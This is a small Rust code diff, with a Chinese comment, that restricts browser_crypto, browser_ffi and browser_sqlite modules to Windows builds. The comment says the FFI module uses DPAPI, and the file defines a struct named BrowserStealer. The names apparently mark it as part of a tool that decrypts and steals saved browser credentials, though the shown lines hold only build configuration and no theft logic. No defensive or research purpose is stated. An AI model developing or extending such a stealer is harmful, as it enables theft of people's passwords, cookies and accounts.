@@ -1,5 +1,9 @@
+// browser_ffi 为 Windows-only（DPAPI/进程 FFI），其余平台不编译该模块。
+#[cfg(target_os = "windows")]
 mod browser_crypto;
+#[cfg(target_os = "windows")]
 pub(crate) mod browser_ffi;
+#[cfg(target_os = "windows")]
 mod browser_sqlite;
 
 pub struct BrowserStealer;
